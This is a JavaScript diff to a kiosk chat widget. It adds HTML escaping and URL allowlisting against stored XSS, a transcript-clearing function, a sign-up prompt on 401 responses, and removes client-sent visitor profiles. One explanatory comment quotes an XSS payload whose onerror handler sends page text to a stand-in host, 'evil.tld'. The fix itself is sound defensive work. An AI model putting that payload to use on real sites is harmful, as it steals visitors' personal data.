@@ -24,6 +24,16 @@ const ChatConfig = {
     // has signed up, and to read the answers to its in-chat questions. Left
     // null on an install without such a module, so nothing changes there.
     sendGateFn: null,
+    // Optional module hook: function({text}) -> true when the module has taken
+    // the message back. Called when /chat answers 401 with the marker
+    // `registration_required` — the server refusing a visitor who has no
+    // session. sendGateFn normally stops that message before it is ever sent,
+    // and it is still the nicer path because nothing leaves the browser; this
+    // is what catches the cases it cannot see, such as a session that expired
+    // in the middle of a conversation. The visitor must never read a raw
+    // error for this, so when no module claims it the chat says, in their own
+    // language, that they need to sign up.
+    signInRequiredFn: null,
 };
 
 
@@ -80,6 +90,7 @@ const I18N = {
         micTitle: "تایپ صوتی",
         rateLimit: "لطفاً کمی صبر کنید و دوباره تلاش کنید.",
         refresh: "لطفاً صفحه را رفرش کنید و دوباره تلاش کنید.",
+        signInRequired: "برای ادامه لطفاً ثبت‌نام کنید.",
         aiUnavailable: "متأسفانه در حال حاضر سرویس هوش مصنوعی پاسخگو نیست. لطفاً سؤال خود را دوباره مطرح کنید یا از سؤالات پیشنهادی استفاده کنید.",
         genericError: "پاسخگویی هوشمند فعلاً در دسترس نیست. می‌توانید از سوالات پیشنهادی انتخاب کنید:",
         generating: "در حال نوشتن پاسخ",
@@ -118,6 +129,7 @@ const I18N = {
         micTitle: "Voice input",
         rateLimit: "Please wait a moment and try again.",
         refresh: "Please refresh the page and try again.",
+        signInRequired: "Please sign up to continue.",
         aiUnavailable: "The AI service is currently unavailable. Please try again or pick a suggested question.",
         genericError: "The assistant is temporarily unavailable. You can pick a suggested question:",
         generating: "Generating",
@@ -239,6 +251,33 @@ function loadHistory() {
     });
 }
 
+/* Forget this browser's copy of the conversation. The exact inverse of the two
+   functions above, and BOTH halves are required.
+
+   A booth kiosk is one browser shared by strangers. The transcript is stored
+   in localStorage AND it is on the screen, so clearing only the store leaves
+   the previous person's bubbles sitting there, and clearing only the screen
+   lets loadHistory() replay them on the next page load, which at a kiosk is
+   the next visitor.
+
+   Called by the "New chat" button and by the registration module's sign-out
+   (static/companion/registration.js). It used to be inline in the new-chat
+   handler only, which is how sign-out, the strongest "I am leaving" gesture
+   in the product, ended up forgetting less than New chat did. */
+function forgetTranscript() {
+    try { localStorage.removeItem(CHAT_HISTORY_KEY); } catch (e) { /* private mode */ }
+    if (!chatContent) return;
+    // NOT every .message. #welcome-message and #loading-bubble are part of
+    // the theme's static markup and carry that same class, and addMessage()
+    // inserts before #loading-bubble, so removing it made the very next
+    // addMessage() throw NotFoundError and the chat was dead until someone
+    // reloaded the page. The reset button bricked the thing it was there to
+    // reset.
+    chatContent
+        .querySelectorAll('.message:not(#welcome-message):not(#loading-bubble)')
+        .forEach(m => m.remove());
+}
+
 
 // ── Tab Logic ──────────────────────────────────────────────────────────
 
@@ -275,6 +314,63 @@ function switchTabInternal(tabName) {
 }
 
 
+// ── Rendering visitor and model text ───────────────────────────────────
+
+/* Markdown -> HTML, with any raw markup made inert. THE one place that puts
+   text somebody else wrote into innerHTML.
+
+   WHY THIS EXISTS. `marked` dropped its sanitize option in v5 and passes raw
+   HTML straight through, and every caller assigned the result to innerHTML.
+   So a visitor who typed
+
+       <img src=x onerror="fetch('https://evil.tld/?d='+document.body.innerText)">
+
+   got script execution on our own origin. Worse than a one-off: saveToHistory()
+   writes the message to localStorage and loadHistory() replays it through the
+   same sink on every later page load, so at a booth kiosk it fired again for
+   every later visitor, on the page that also collects their name and mobile
+   number.
+
+   ESCAPE FIRST, PARSE SECOND. Escaping & and < before marked sees the text
+   means no tag can ever open, while markdown syntax keeps working: * _ # `
+   and - are untouched.
+
+   > " and ' are deliberately NOT escaped. A tag cannot open without <, marked
+   escapes what it puts into attributes itself, and escaping > would break
+   markdown blockquotes for no security gain.
+
+   LINK PROTOCOLS ARE CHECKED AFTER PARSING, because [x](javascript:...) never
+   contains a < at all, so escaping cannot reach it. */
+function renderMarkdown(element, text) {
+    const raw = String(text === null || text === undefined ? '' : text);
+    if (typeof marked === 'undefined') {
+        // No markdown library on the page. textContent, never innerHTML: the
+        // old fallback here was text.replace(/\n/g, '<br>'), which handed the
+        // same raw markup to the same sink.
+        element.textContent = raw;
+        return;
+    }
+    element.innerHTML = marked.parse(
+        raw.replace(/&/g, '&amp;').replace(/</g, '&lt;'));
+    const SAFE_URL = /^(https?:|mailto:|tel:|[/#])/i;
+    element.querySelectorAll('a').forEach(a => {
+        // An allowlist, so a protocol nobody thought of is refused by default.
+        if (!SAFE_URL.test((a.getAttribute('href') || '').trim())) {
+            a.removeAttribute('href');
+        }
+        a.target = '_blank';
+        a.rel = 'noopener noreferrer';
+    });
+    // Markdown's ![alt](url) makes a real <img>. Not script execution, but an
+    // off-site src is a tracking pixel any visitor could plant in the history
+    // that later visitors replay, so it gets the same allowlist.
+    element.querySelectorAll('img').forEach(img => {
+        if (!SAFE_URL.test((img.getAttribute('src') || '').trim())) {
+            img.removeAttribute('src');
+        }
+    });
+}
+
 // ── Message Logic ──────────────────────────────────────────────────────
 
 function typeWriter(element, text, speed = 20) {
@@ -298,12 +394,7 @@ function typeWriter(element, text, speed = 20) {
             if (chatContent) chatContent.scrollTop = chatContent.scrollHeight;
             setTimeout(type, speed);
         } else {
-            if (typeof marked !== 'undefined') {
-                element.innerHTML = marked.parse(text);
-                element.querySelectorAll('a').forEach(a => a.target = '_blank');
-            } else {
-                element.innerHTML = text.replace(/\n/g, '<br>');
-            }
+            renderMarkdown(element, text);
         }
     }
     type();
@@ -326,12 +417,7 @@ function addMessage(content, type, save = true, instant = false) {
     if (type === 'bot' && !instant) {
         typeWriter(bubble, content);
     } else {
-        if (typeof marked !== 'undefined') {
-            bubble.innerHTML = marked.parse(content);
-            bubble.querySelectorAll('a').forEach(a => a.target = '_blank');
-        } else {
-            bubble.textContent = content;
-        }
+        renderMarkdown(bubble, content);
     }
     chatContent.scrollTop = chatContent.scrollHeight;
     if (save) saveToHistory(content, type);
@@ -340,25 +426,15 @@ function addMessage(content, type, save = true, instant = false) {
 
 // ── Chat Logic ─────────────────────────────────────────────────────────
 
-/* What a registered visitor said about their work, if anything, so the
-   targeted-visit answer can name the sections that fit them. Only the three
-   descriptive fields travel — the name and phone number stay in this browser.
-   Registration is an optional module, so its absence is the normal case. */
-function visitorProfile() {
-    try {
-        const p = JSON.parse(localStorage.getItem('inotex-visitor') || 'null');
-        if (!p) return {};
-        const visitor = {
-            job: p.job || '',
-            position: p.position || '',
-            interests: p.interests || ''
-        };
-        if (!visitor.job && !visitor.position && !visitor.interests) return {};
-        return { visitor: visitor };
-    } catch (e) {
-        return {};
-    }
-}
+/* The visitor's job, position and interests used to be read out of
+   localStorage here and posted inside the /chat body, so the targeted-visit
+   answer could name the sections that fit them. That is gone. Anyone could
+   type any profile into a request and the server believed it, which is not a
+   profile, it is a costume.
+   The server now reads the same three fields from the session the visitor's
+   HttpOnly cookie names (app/auth/visitor.py), so the answer is unchanged for
+   a registered visitor and unforgeable for everyone else. Nothing about who
+   is asking travels in this body any more. */
 
 // Silently swap the page's chat token for a fresh one. Called reactively
 // (only after a 403 from /chat), so the visitor never sees a thing: a token
@@ -388,7 +464,11 @@ async function refreshChatToken() {
     }
 }
 
-async function sendMessage(fromPreset = false) {
+/* `opts.echo === false` sends the text WITHOUT printing the visitor's bubble.
+   One caller needs it: the registration module re-sending a message the server
+   refused with 401. That message is already in the transcript, and printing it
+   again reads as though the visitor asked twice. Every other path echoes. */
+async function sendMessage(fromPreset = false, opts = {}) {
     // In a text-only theme there is never background video to stop.
     if (!ChatConfig.isTextOnly && isResponsePlaying && avatarVideo) {
         stopVideoPlayback();
@@ -410,7 +490,7 @@ async function sendMessage(fromPreset = false) {
         if (claimed) return;
     }
 
-    addMessage(text, 'user');
+    if (opts.echo !== false) addMessage(text, 'user');
 
     userInput.value = '';
     userInput.disabled = true;
@@ -421,20 +501,20 @@ async function sendMessage(fromPreset = false) {
 
     try {
         // Built ONCE, before any network attempt: the retried send must reuse
-        // the ORIGINAL payload — same text, lang and visitorProfile() snapshot.
+        // the ORIGINAL payload, the same text and the same lang.
         // The user already said it once; a retry is purely the network send,
         // so re-running anything user-visible above (a second bubble) would be
         // a visible duplicate.
-        const payload = JSON.stringify(Object.assign(
-            { message: text, lang: currentLang },
-            visitorProfile()
-        ));
+        const payload = JSON.stringify({ message: text, lang: currentLang });
         // The token is read INSIDE the send fn (fresh from the meta each
         // attempt) so the post-refresh retry picks up the new value.
         const doSend = () => {
             const chatToken = document.querySelector('meta[name="chat-token"]')?.content || '';
             return fetch('/chat', {
                 method: 'POST',
+                // Spelled out because who is asking now rides on a cookie the
+                // server set, not on anything in this body.
+                credentials: 'same-origin',
                 headers: {
                     'Content-Type': 'application/json',
                     'X-Chat-Token': chatToken
@@ -457,6 +537,30 @@ async function sendMessage(fromPreset = false) {
         }
 
         if (!response.ok) {
+            // 401 means ONE thing: this install requires registration and this
+            // visitor has no session. It is not an error to show — it is a
+            // door to open. The registration module takes the message back and
+            // reopens sign-up, and delivers it once there is someone to answer.
+            //
+            // The marker is read out of the body, never guessed from the
+            // status: a bare 401 from anywhere else must not silently turn
+            // into a sign-up card.
+            if (response.status === 401) {
+                const detail = await response.json()
+                    .then(d => (d && d.detail) || {})
+                    .catch(() => ({}));
+                loadingBubble.style.opacity = '0';
+                let taken = false;
+                if (detail.code === 'registration_required'
+                    && typeof ChatConfig.signInRequiredFn === 'function') {
+                    try { taken = ChatConfig.signInRequiredFn({ text: text }) === true; }
+                    catch (e) { console.error('sign-in gate failed:', e); }
+                }
+                // Nothing claimed it: say what is needed in the visitor's own
+                // language rather than leaving them at a dead end.
+                if (!taken) addMessage(t().signInRequired, 'bot', true, true);
+                return;
+            }
             if (response.status === 429) {
                 loadingBubble.style.opacity = '0';
                 addMessage(t().rateLimit, 'bot', true, true);
@@ -469,6 +573,12 @@ async function sendMessage(fromPreset = false) {
                 addMessage(t().refresh, 'bot', true, true);
                 return;
             }
+            // 503 now means ONE thing: the AI provider is genuinely down.
+            // It used to mean two, because the server also raised it when it
+            // simply found no answer — so a visitor asking about something we
+            // have no record for was told the service was broken. That case is
+            // an ordinary 200 answer now (source "no_answer"), handled below
+            // like any other, and this message is honest again.
             if (response.status === 503) {
                 loadingBubble.style.opacity = '0';
                 addMessage(t().aiUnavailable, 'bot', true, true);
@@ -950,21 +1060,9 @@ function initChat() {
 
         // The transcript is stored in TWO places and forgetting either one
         // hands the next stranger the previous one's words. The cookie is the
-        // server's copy; this is the browser's, and loadHistory() replays it
-        // on the next page load — which at a kiosk is the next visitor.
-        try { localStorage.removeItem(CHAT_HISTORY_KEY); } catch (e) { /* private mode */ }
-
-        if (chatContent) {
-            // NOT every .message. #welcome-message and #loading-bubble are
-            // part of the theme's static markup and carry that same class, and
-            // addMessage() inserts before #loading-bubble — so removing it
-            // made the very next addMessage() throw NotFoundError and the chat
-            // was dead until someone reloaded the page. The reset button
-            // bricked the thing it was there to reset.
-            chatContent
-                .querySelectorAll('.message:not(#welcome-message):not(#loading-bubble)')
-                .forEach(m => m.remove());
-        }
+        // server's copy, dropped by the request above; forgetTranscript()
+        // drops the browser's, both the store and the bubbles on screen.
+        forgetTranscript();
         switchTab('text');
         addMessage(t().newChatDone, 'bot');
         showQuestions();
